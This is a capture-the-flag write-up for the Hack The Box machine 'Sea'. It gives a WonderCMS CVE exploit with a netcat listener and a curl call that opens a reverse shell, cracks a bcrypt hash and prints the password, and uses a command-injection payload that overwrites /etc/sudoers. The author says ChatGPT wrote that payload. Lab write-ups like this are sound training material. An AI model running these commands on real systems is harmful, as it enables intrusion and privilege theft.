# Sea.HTB

## Recon 

### Rustscan 

Scanning all open ports to find what services are running 

```bash
rustscan -a 10.129.235.245 --ulimit 9000 -- -A -O
```

so the website has only exposed SSH and HTTP ports 

adding to hosts file and exploring the website 

Only found this php form 


```html
http://sea.htb/contact.php
```
### WhatWeb Scanning

```bash
whatweb http://sea.htb
```

whatweb scan shows that the website runs on PHP "Cookies"

```bash
http://sea.htb [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.235.245], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]
```

### FFUF Directory Enumeration

```bash
ffuf -u http://sea.htb/FUZZ -t 100 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```

```bash
 ffuf -u http://sea.htb/themes/FUZZ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
```

```bash
 ffuf -u http://sea.htb/themes/bike/FUZZ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
```

after 30 mins of webfuzzing i found the "http://sea.htb//themes/bike/LICENSE" and "http://sea.htb//themes/bike/README.md"  endpoint

README.md consist of this 

```bash
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```                              

### Finding Exploit
                                        
after a simple google search i found "WonderCMS" exploit "CVE-2023-41425"

```bash
https://github.com/prodigiousMind/CVE-2023-41425
```

To use this exploit we need a little patience 

- start netcat listener 

```bash
nc -lnvp 6969
```

- run the python exploit 

```bash
python3 exploit.py http://sea.htb/themes 10.10.14.16 6969
```

- curl to the exploit (Read CVE for full explanation)

```bash
curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.16&lport=6969' 
```

and BOOM!! we're in the machine

- running linpeas to find some clues for privilage escalation

Found database.js with the help of linpeas

```bash


╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                             
/dev/mqueue
/dev/shm
/dev/shm/chisel_1.10.0_linux_amd64
/run/lock
/run/lock/apache2
/run/screen
/snap/core20/2318/run/lock
/snap/core20/2318/tmp
/snap/core20/2318/var/tmp
/tmp
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/sea
/var/www/sea/.htaccess
/var/www/sea/contact.php
/var/www/sea/data
/var/www/sea/data/cache.json
/var/www/sea/data/database.js
```

and we got the passowrd hash of our user 

```js
cat /var/www/sea/data/database.js 	
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q",
}}
```

### Finding and Cracking Password Hash

copy the hash in a file and use hash analyzer to find hash type

- bcrypt hash identified

Using hashcat to crack password


```bash
hashcat -m 3200 -a 0 hash /usr/share/seclists/rockyou.txt
```

```bash
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Thu Aug 15 17:31:18 2024 (5 secs)
Time.Estimated...: Thu Aug 15 17:31:23 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Started: Thu Aug 15 17:31:14 2024
Stopped: Thu Aug 15 17:31:25 2024
```

### Login Via SSH

```bash

ssh amay@sea.htb
```
```bash
cat user.txt
```

### User flag captured

### Privilage Escalation

Again running linpeas to find any leads

- Found a webserver running in port "8080"

### Tunneling

- Creating a tunnel between sea and localmachine to gather information about the webserver running on port "8080"

```bash 
ssh -L 6969:localhost:8080 amay@sea.htb
```

browsing http://localhost:6969 and logging in with the user amay and its password 

- the webserver reveals a "System Monitor(Developing) page"

- we can access log files
- in the access.log got the first clue about root

### Burpsuite

so this endopint will read the data in auth.log file and it will display data in the webserver

```bash
log_file=%2Fvar%2Flog%2Fauth.log&analyze_log=
```

what if I change the path and read root.txt

```bash
%2Froot%2Froot.txt
```

failed


-  I asked Chatgpt to write a payload for me that would get me /root/root.txt Here is the payload

"log_file=/root/root.txt;cp/dev/shm/sudoers> /etc/suoders&analyze_log"

Got the root flag

143996beee3b052762b83de055096952
